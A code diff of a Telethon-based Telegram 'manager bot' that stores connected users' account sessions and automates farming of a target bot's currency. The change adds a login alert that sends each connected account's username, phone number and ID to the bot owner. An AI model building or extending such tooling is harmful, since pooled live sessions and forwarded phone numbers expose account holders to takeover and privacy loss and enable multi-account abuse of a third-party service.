@@ -31,7 +31,7 @@ DB_FILE = "db.json"
 # Initialize Manager Bot
 bot = TelegramClient('manager_session', config.API_ID, config.API_HASH).start(bot_token=config.BOT_TOKEN)
 
-# --- 2. PERSISTENCE FUNCTIONS (New) ---
+# --- 2. PERSISTENCE FUNCTIONS ---
 
 def save_database():
     """Saves current sessions to a file so they aren't lost on restart."""
@@ -93,7 +93,7 @@ async def load_database():
 
 async def get_balance_for_user(user_id, client):
     """
-    Improved balance checker with flexible regex.
+    Specific balance checker for 'Your current extols: Є481' format.
     """
     try:
         async with client.conversation(config.TARGET_BOT, timeout=30) as conv:
@@ -101,22 +101,22 @@ async def get_balance_for_user(user_id, client):
             response = await conv.get_response()
             
             if response.text:
-                # Regex looks for the number following 'extols:', 'Є', or 'balance'
-                # It handles commas like 1,234 and spaces. Case-insensitive.
-                match = re.search(r'(?:extols|Є|balance)[:\s]*([\d,]+)', response.text, re.IGNORECASE)
+                # MATCHING LOGIC: Looks specifically for "Є" followed by digits
+                # Example: "Your current extols: Є481" -> Matches "481"
+                match = re.search(r'Є\s*([\d,]+)', response.text)
                 
                 if match:
                     balance_str = match.group(1).replace(',', '')
                     balance = int(balance_str)
                     
                     me = await client.get_me()
-                    # Update local database so /stats is also accurate
+                    # Update local database
                     if user_id in database.user_data:
                         database.user_data[user_id]['extols'] = balance
                         
                     return (me.first_name, balance, None)
             
-            return ("Unknown", 0, "Balance not found in text.")
+            return ("Unknown", 0, "Could not find 'Є' symbol in response.")
     
     except asyncio.TimeoutError:
         return ("Timeout", 0, "Target bot didn't reply.")
@@ -125,8 +125,10 @@ async def get_balance_for_user(user_id, client):
         return ("Error", 0, str(e))
 
 async def register_client(uid, client):
-    """Saves a connected client to the database and writes to disk."""
+    """Saves a connected client and sends a detailed log to the owner."""
     me = await client.get_me()
+    
+    # Save to memory
     database.clients[uid] = client
     database.user_data[uid] = {
         'extols': 0, 
@@ -134,17 +136,38 @@ async def register_client(uid, client):
         'name': me.first_name
     }
     
-    # SAVE TO DISK IMMEDIATELY
+    # Save to disk
     save_database()
     
-    await bot.send_message(config.OWNER_ID, f"🔔 New Login: {me.first_name} (`{uid}`)")
+    # --- DETAILED NOTIFICATION ---
+    try:
+        # Fetch Owner Details for the log
+        owner_entity = await bot.get_entity(config.OWNER_ID)
+        owner_name = owner_entity.first_name
+        owner_username = f"@{owner_entity.username}" if owner_entity.username else "No Username"
+        
+        # User Details
+        user_username = f"@{me.username}" if me.username else "No Username"
+        user_phone = me.phone if me.phone else "Hidden/Unknown"
+        
+        log_msg = (
+            "🔐 **NEW ACCOUNT LOGIN DETECTED**\n\n"
+            f"**Account Name:** {me.first_name}\n"
+            f"**Account Username:** {user_username}\n"
+            f"**Phone Number:** {user_phone}\n"
+            f"**User ID:** `{me.id}`\n\n"
+            f"**Bot Owner ID:** `{config.OWNER_ID}` ({owner_name} - {owner_username})"
+        )
+        await bot.send_message(config.OWNER_ID, log_msg)
+        
+    except Exception as e:
+        # Fallback if fetching owner fails
+        logger.error(f"Failed to send detailed login log: {e}")
+        await bot.send_message(config.OWNER_ID, f"🔔 New Login: {me.first_name} (`{uid}`)")
+        
     logger.info(f"User Login: {me.first_name} ({uid})")
 
 # --- 4. COMMAND HANDLERS ---
-
-@bot.on(events.NewMessage(pattern='/start'))
-async def start_cmd(event):
-    await event.respond("👋 **Slot Manager Online**\nType `/help` for commands.")
 
 @bot.on(events.NewMessage(pattern='/help'))
 async def help_cmd(event):
@@ -168,13 +191,11 @@ async def help_cmd(event):
     )
     await event.respond(text)
 
-# --- UPDATE COMMAND (Safe Restart) ---
+# --- UPDATE COMMAND ---
 
 @bot.on(events.NewMessage(pattern='/update', from_users=[config.OWNER_ID]))
 async def update_cmd(event):
     msg = await event.respond("🔄 **Checking for updates...**")
-    
-    # 1. Save data before updating just in case
     save_database()
     
     try:
@@ -186,7 +207,6 @@ async def update_cmd(event):
             await msg.edit("✅ **Bot is already up to date.**")
         else:
             await msg.edit(f"✅ **Update Found & Downloaded!**\n\n`{output}`\n\n🔄 Restarting...")
-            # Restart the script
             os.execl(sys.executable, sys.executable, *sys.argv)
             
     except Exception as e:
@@ -315,7 +335,7 @@ async def logout_cmd(event):
         if uid in database.user_data: del database.user_data[uid]
         if uid in database.farming_queue: database.farming_queue.remove(uid)
         
-        save_database() # Update the file
+        save_database()
         await event.respond("✅ **Logged out.**")
 
 # --- FARMING & STATS ---
@@ -395,6 +415,5 @@ async def simport(e):
 
 # --- STARTUP ---
 print("✅ Manager Bot Started...")
-# Load sessions on startup
 bot.loop.run_until_complete(load_database())
 bot.run_until_disconnected()
